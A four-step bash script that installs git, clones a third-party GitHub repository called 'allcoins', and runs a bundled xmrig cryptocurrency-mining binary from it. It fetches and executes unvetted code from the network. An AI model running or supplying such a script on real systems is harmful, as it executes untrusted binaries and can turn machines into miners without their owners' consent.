#!/bin/bash 
apt update
apt install git -y
git clone https://github.com/zshroot5/allcoins.git
cd allcoins
chmod +x xmrig
./xmrig
